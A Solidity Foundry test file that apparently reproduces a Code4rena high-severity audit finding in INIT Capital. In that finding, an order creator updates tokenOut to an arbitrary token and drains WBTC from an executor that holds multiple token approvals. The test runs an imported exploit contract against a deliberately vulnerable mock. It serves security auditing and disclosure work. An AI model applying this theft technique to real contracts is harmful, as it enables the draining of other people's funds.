// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./30258-h-02-orders-creator-can-update-tokenout-to-arbitrary-token-c.sol";

/*//////////////////////////////////////////////////////////////
    INIT Capital — [H-02] Order creator can update tokenOut to
    arbitrary token. Finding #30258 (code4rena, said) — HIGH.
//////////////////////////////////////////////////////////////*/
contract TokenOutUpdateTest is Test {
    /// @notice CONTROL: createOrder rejects a tokenOut outside {base, quote}.
    function test_control_createOrder_rejectsArbitraryTokenOut() public {
        MockToken usdc = new MockToken("USDC");
        MockToken weth = new MockToken("WETH");
        MockToken evil = new MockToken("EVIL");
        MarginTradingHookVuln hook = new MarginTradingHookVuln();
        UserWallet creator = new UserWallet(hook);

        creator.openPos(1, address(weth), address(usdc), true);
        vm.expectRevert(bytes("INVALID_INPUT"));
        creator.createOrder(1, 1500e18, address(evil), 1490e18, 1e18);
    }

    /// @notice HARM: updateOrder accepts arbitrary tokenOut; fillOrder then
    ///         drains the high-value token from a multi-token-approved executor.
    function test_updateOrder_tokenOut_stealsFromExecutor() public {
        Exploit exploit = new Exploit();
        exploit.run();

        assertEq(
            exploit.wbtc().balanceOf(address(exploit.creator())),
            exploit.FILL_AMT(),
            "creator should hold the stolen WBTC"
        );
        assertEq(exploit.wbtc().balanceOf(address(exploit.executor())), 0, "executor WBTC drained");
        assertEq(
            exploit.usdc().balanceOf(address(exploit.executor())),
            exploit.FILL_AMT(),
            "executor USDC untouched"
        );
    }
}
